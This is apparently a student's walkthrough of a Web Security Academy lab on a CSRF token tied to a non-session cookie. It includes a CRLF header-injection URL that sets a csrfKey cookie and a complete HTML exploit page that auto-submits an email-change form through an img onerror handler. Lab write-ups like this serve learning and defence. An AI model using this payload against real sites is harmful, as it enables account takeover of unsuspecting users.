1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that changing the `session` cookie logs you out, but changing the `csrfKey` cookie merely results in the CSRF token being rejected. This suggests that the `csrfKey` cookie may not be strictly tied to the session.
3. ![[Pasted image 20250201202757.png]]
4. Open a private/incognito browser window, log in to your other account, and send a fresh update email request into Burp Repeater.
5. Observe that if you swap the `csrfKey` cookie and `csrf` parameter from the first account to the second account, the request is accepted.
6. Close the Repeater tab and incognito browser.
7. Back in the original browser, perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
8. Create a URL that uses this vulnerability to inject your `csrfKey` cookie into the victim's browser:
    
    `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None`
8. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab, ensuring that you include your CSRF token. The exploit should be created from the email change request.
9. Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:
    
    `<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`
10. Change the email address in your exploit so that it doesn't match your own.


`<html>`
    `<body>`
        `<h1>Hello World!</h1>`
        `<form action="https:///0aa1007c0323e68e80cbf98100f0007a.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">`
            `<input type="hidden" name="email" value="test5@test.ca">`
            `<input type="hidden" name="csrf" value="GcZCQZ5cefIwvMAsR4faupH2kAlXHww9">`
        `</form>`

        `<img src="https://0aa1007c0323e68e80cbf98100f0007a.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=bYuPKbmyIDmHsxiQc2GJOSASBg08GyzX%3b%20SameSite=None" onerror="document.forms[0].submit()">`
    `</body>`
`</html>`